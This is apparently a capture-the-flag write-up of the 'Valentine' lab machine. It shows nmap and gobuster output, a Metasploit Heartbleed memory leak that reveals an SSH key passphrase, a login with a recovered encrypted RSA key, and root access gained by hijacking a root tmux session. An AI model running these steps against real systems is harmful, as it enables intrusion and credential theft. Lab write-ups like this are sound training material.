# nmap
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.189.67
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 11:53 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:53
Completed Parallel DNS resolution of 1 host. at 11:53, 0.04s elapsed
Initiating SYN Stealth Scan at 11:53
Scanning 10.129.189.67 [20000 ports]
Discovered open port 80/tcp on 10.129.189.67
Discovered open port 22/tcp on 10.129.189.67
Discovered open port 443/tcp on 10.129.189.67
SYN Stealth Scan Timing: About 51.34% done; ETC: 11:54 (0:00:30 remaining)
SYN Stealth Scan Timing: About 58.45% done; ETC: 11:55 (0:00:44 remaining)
SYN Stealth Scan Timing: About 67.36% done; ETC: 11:56 (0:00:52 remaining)
SYN Stealth Scan Timing: About 77.72% done; ETC: 11:57 (0:00:46 remaining)
SYN Stealth Scan Timing: About 84.60% done; ETC: 11:58 (0:00:38 remaining)
Completed SYN Stealth Scan at 11:59, 321.15s elapsed (20000 total ports)
Initiating Service scan at 11:59
Scanning 3 services on 10.129.189.67
Completed Service scan at 11:59, 14.13s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.129.189.67
Retrying OS detection (try #2) against 10.129.189.67
Retrying OS detection (try #3) against 10.129.189.67
Retrying OS detection (try #4) against 10.129.189.67
Retrying OS detection (try #5) against 10.129.189.67
Initiating Traceroute at 11:59
Completed Traceroute at 11:59, 0.45s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:59
Completed Parallel DNS resolution of 2 hosts. at 11:59, 0.06s elapsed
NSE: Script scanning 10.129.189.67.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:59
Completed NSE at 12:00, 13.49s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 3.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
Nmap scan report for 10.129.189.67
Host is up, received user-set (0.29s latency).
Scanned at 2021-08-16 11:53:56 IST for 375s
Not shown: 19997 closed ports
Reason: 19997 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6LHkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5QREuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoRfGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaMcYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUSGl1UsGjY0QGsA5l5ohfQ==
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPPM7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9qdeBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZUADy8A6tbfSgopaeR2UN4QRgM1dX
|   256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQee5RRw9d+lgH3Fm5O9XI=
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
| SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
| -----BEGIN CERTIFICATE-----
| MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV
| BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG
| A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1
| MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50
| aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao
| oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1
| PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg
| 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6
| 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz
| pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O
| BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy
| fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7
| cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N
| XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO
| 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S
| q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP
| csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa
| gRSFfyZx/VqBh9c=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-16T06:30:07+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/16%OT=22%CT=1%CU=39065%PV=Y%DS=2%DC=T%G=Y%TM=611A05F
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M54BST11NW4%O2=M54BST11NW4%O3=M54BNNT11NW4%O4=M54BST11NW4%O5=M54BST1
OS:1NW4%O6=M54BST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN
OS:(R=Y%DF=Y%T=40%W=3908%O=M54BNNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M54BST11NW4%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.003 days (since Mon Aug 16 11:56:20 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   438.24 ms 10.10.16.1
2   198.59 ms 10.129.189.67

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.17 seconds
           Raw packets sent: 21807 (963.318KB) | Rcvd: 26707 (2.058MB)
```
## script results
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -script vuln 10.129.189.67 -T4 --vv                                                            130 â¨¯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 12:27 IST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:27
Completed NSE at 12:27, 0.00s elapsed
Initiating Ping Scan at 12:27
Scanning 10.129.189.67 [4 ports]
Completed Ping Scan at 12:27, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:27
Completed Parallel DNS resolution of 1 host. at 12:27, 0.01s elapsed
Initiating SYN Stealth Scan at 12:27
Scanning 10.129.189.67 [1000 ports]
Discovered open port 22/tcp on 10.129.189.67
Discovered open port 443/tcp on 10.129.189.67
Discovered open port 80/tcp on 10.129.189.67
Completed SYN Stealth Scan at 12:27, 3.29s elapsed (1000 total ports)
NSE: Script scanning 10.129.189.67.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:27
NSE Timing: About 99.34% done; ETC: 12:28 (0:00:00 remaining)
Completed NSE at 12:28, 39.26s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 1.93s elapsed
Nmap scan report for 10.129.189.67
Host is up, received echo-reply ttl 63 (0.33s latency).
Scanned at 2021-08-16 12:27:30 IST for 45s
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
443/tcp open  https   syn-ack ttl 63
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: 

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 55.17 seconds
           Raw packets sent: 1120 (49.256KB) | Rcvd: 1120 (44.804KB)
```

seeing the results we can find that the current version of ssl is vulnerable and it says somekind of information leak.
I googled it and found that it's the heartbleed bug.

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.189.67 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.189.67
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/16 11:54:21 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.189.67/.htaccess            [Size: 290]
http://10.129.189.67/.hta                 [Size: 285]
http://10.129.189.67/.htpasswd            [Size: 290]
http://10.129.189.67/cgi-bin/             [Size: 289]
http://10.129.189.67/decode               [Size: 552]
http://10.129.189.67/dev                  [Size: 312] [--> http://10.129.189.67/dev/]
http://10.129.189.67/encode               [Size: 554]                                
http://10.129.189.67/index                [Size: 38]                                 
http://10.129.189.67/index.php            [Size: 38]                                 
http://10.129.189.67/server-status        [Size: 294]                                
                                                                                     
===============================================================
2021/08/16 11:56:20 Finished
===============================================================
```
I opened /dev directory and found hype_key which are hex bytes,when converted to ascii gave a rsa private key.
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY----
```

# metasploit
I searched for heartbleed in metasploit and found an auxillary scanner module scanner/ssl/openssl_heartbleed.

setting the appropriate parameters and executing it gave 
```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[*] 10.129.189.67:443     - Leaking heartbeat response #1
[*] 10.129.189.67:443     - Sending Client Hello...
[*] 10.129.189.67:443     - SSL record #1:
[*] 10.129.189.67:443     -     Type:    22
[*] 10.129.189.67:443     -     Version: 0x0301
[*] 10.129.189.67:443     -     Length:  86
[*] 10.129.189.67:443     -     Handshake #1:
[*] 10.129.189.67:443     -             Length: 82
[*] 10.129.189.67:443     -             Type:   Server Hello (2)
[*] 10.129.189.67:443     -             Server Hello Version:           0x0301
[*] 10.129.189.67:443     -             Server Hello random data:       611a0dbc4d083441c6ed70d2e7cb6e58df96a409b7e72241f2b9253f8d00f500
[*] 10.129.189.67:443     -             Server Hello Session ID length: 32
[*] 10.129.189.67:443     -             Server Hello Session ID:        663e73c897c654ed05389c8f013ce7fa6022d292b02f3b93bea63b474a46fda0
[*] 10.129.189.67:443     - SSL record #2:
[*] 10.129.189.67:443     -     Type:    22
[*] 10.129.189.67:443     -     Version: 0x0301
[*] 10.129.189.67:443     -     Length:  885
[*] 10.129.189.67:443     -     Handshake #1:
[*] 10.129.189.67:443     -             Length: 881
[*] 10.129.189.67:443     -             Type:   Certificate Data (11)
[*] 10.129.189.67:443     -             Certificates length: 878
[*] 10.129.189.67:443     -             Data length: 881
[*] 10.129.189.67:443     -             Certificate #1:
[*] 10.129.189.67:443     -                     Certificate #1: Length: 875
[*] 10.129.189.67:443     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, issuer=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, serial=#<OpenSSL::BN:0x00007f1a79af61b8>, not_before=2018-02-06 00:45:25 UTC, not_after=2019-02-06 00:45:25 UTC>
[*] 10.129.189.67:443     - SSL record #3:
[*] 10.129.189.67:443     -     Type:    22
[*] 10.129.189.67:443     -     Version: 0x0301
[*] 10.129.189.67:443     -     Length:  331
[*] 10.129.189.67:443     -     Handshake #1:
[*] 10.129.189.67:443     -             Length: 327
[*] 10.129.189.67:443     -             Type:   Server Key Exchange (12)
[*] 10.129.189.67:443     - SSL record #4:
[*] 10.129.189.67:443     -     Type:    22
[*] 10.129.189.67:443     -     Version: 0x0301
[*] 10.129.189.67:443     -     Length:  4
[*] 10.129.189.67:443     -     Handshake #1:
[*] 10.129.189.67:443     -             Length: 0
[*] 10.129.189.67:443     -             Type:   Server Hello Done (14)
[*] 10.129.189.67:443     - Sending Heartbeat...
[*] 10.129.189.67:443     - Heartbeat response, 65535 bytes
[+] 10.129.189.67:443     - Heartbeat response with leak, 65535 bytes
[*] 10.129.189.67:443     - Printable info leaked:
......a.](..K.w..8.h....*....c..$>......f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................ux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==K......S..L..%R...!............../2005/amfx"><body>.    <object type="flex.messaging.messages.CommandMessage">.    <traits><string>body</string><string>clientId</string>.    <string>correlationId</string><string>destination</string>.    <string>headers</string><string>messageId</string><string>.    operation</string><string>timestamp</string><string>timeToLive.    </string></traits><object><traits /></object><null /><string />.    <string /><object><traits><string>DSId</string><string>.    DSMessagingVersion</string></traits><string>nil</string>.    <int>1</int></object><string>&x3;</string><int>5</int>.    <int>0</int><int>0</int></object></body></amfx>.....c.nRx...2....u........ve..Host: 10.129.189.67....GET /_vti_bin/_vti_adm/admin.dll HTTP/1.1..User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)..Connection: keep-alive..Host: 10.129.189.67....GET /_vti_bin/_vti_adm/admin.exe HTTP/1.1..User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)..Connection: keep-alive..Host: 10.129.189.67....GET /_vti_bin/fpcount.exe?Page=default.asp|Image=3 HTTP/1.1..User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)..Connection: keep-alive..Host: 10.129.189.67....GET /_vti_bin/shtml.dll HTTP/1.1..User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)..Connection: close..Host: 10.129.189.67......JT]./......>.'..NB.s://nmap.org/book/nse.html)..Connection: close..Host: 10.129.189.67..../.S.q\....K...,X..................................................................................................................................... repeated 14210 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................A.vv?....C..z.X.XuR....G.6D'.......c..-d...HK......w....i<..........;..x..u...ms.V........".5..p.Z.%s9......4....c..hj..."........23Q.<i....>v.\................NP............# ...............Gtg...[...Rss.;~.e...@..k.)..n'L.0d.N..ZY.>..q...?H....1...&...........o...>.1.:.......a.2..q.<i.D/&dp,s..........2}_.J...=..\D.....[..s..wv..H.9J..=@....h....M?O.....t]Sd.WjD...............fwF)u`....Y0:...!.].".V.z/.'\....UF.."..fb%....8m....z.1MC&......H..Oy...D.e..wGV.M;...M.-)..Z......ls......... ...P....H.}.....m...^.......P0N0...U........["lr...U.|.va..O..0...U.#..0.....["lr...U.|.va..O..0...U....0....0...*.H.............'760{pu..<pu.q.......q"..FT.bs:.C.b.2.C....eJ.A...iO.\hl.K.-E..4..c8.oj.c...N..."ES..#D.>..u.f.B...R..'.Di...S.N..r^....9......`.=....5...m[.......]......2-.RM..tL....7R.Qp.5..a......c..@.ZCs.H.{..r.0 t.u..w.9....N.&...o...|Pr.............^r...Z....&q.Z..................................................................................................................................... repeated 14903 times .....................................................................................................................................@..................................................................................................................................... repeated 151 times .....................................................................................................................................aU.............A.vv?....C..z.X.XuR....G.6D'.......c..-d...HK......w....i<..........;..x..u...ms.V........".5..p.Z.%s9......4....c..hj..."........23Q.<i....>v.\................NP............# ...............Gtg...[...Rss.;~.e...@..k.)..n'L.0d.N..ZY.>..q...?H....1...&...........o...>.1.:.......a.2..q.<i.D/&dp,s..........2}_.J...=..\D.....[..................................................................................................................................... repeated 15347 times .....................................................................................................................................
[*] 10.129.189.67:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I copied the text "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" which looks like base64 and i decoded it.

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

I tried logging in into the machine via ssh using the private key
as user hype.

>ssh -i hype hype@10.129.189.67

```
Enter passphrase for key 'rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
hype@Valentine:~$ 
```
# PrivEsc

user.txt
```
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ find . -type f -name user.txt
./Desktop/user.txt
```
I uploaded linpeas on the machine to check for possible misconfigurations.

```
[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions           
                                                                                              
root       1191  0.0  0.1  26416  1672 ?        Ss   Aug15   0:01 /usr/bin/tmux -S /.devs/dev_sess 
```

```
/home/hype/.tmux.conf
```

I searched for privesc techniques using tmux and found [this](https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0)

so,I ran 
>/usr/bin/tmux -S /.devs/dev_sess

I am root  :)

```
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/home/hype# whoami
root
root@Valentine:/home/hype#
```

